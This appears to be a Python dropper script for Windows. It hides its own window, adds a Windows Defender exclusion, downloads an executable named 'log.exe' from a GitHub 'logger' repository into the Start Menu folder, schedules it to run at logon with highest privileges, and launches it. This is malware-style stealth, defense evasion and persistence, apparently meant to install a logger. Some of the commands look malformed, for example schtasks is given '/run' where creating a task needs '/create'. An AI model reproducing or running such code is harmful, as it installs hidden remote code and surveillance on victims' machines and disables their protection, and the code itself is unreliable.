import os
from win32gui import ShowWindow, GetForegroundWindow
from requests import get
from subprocess import run

url = 'https://github.com/Pixel48/logger/raw/exe/installer.exe'

folderpath = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Logger')
filepath = os.path.join(folderpath, 'log.exe')

def download(url, path):
    with open(path, 'wb') as file:
        response = get(url)
        file.write(response.content)

def hide_window():
    window = GetForegroundWindow()
    ShowWindow(window, 0)

def setup_task():
    run(['schtasks', '/run', '/tn', 'Log', '/tr', f'"{filepath}"', '/sc', 'onlogon', '/rl', 'highest'])

def setup_defender():
    command = f'Add-MpPreference -ExclusionPath "{folderpath}"'
    run(['powershell', 'Add-MpPreference', '-ExclusionPath', command], check=True)

def main():
    hide_window()
    setup_defender()
    download(url, filepath)
    setup_task()
    os.startfile(filepath)

if __name__ == '__main__':
    main()
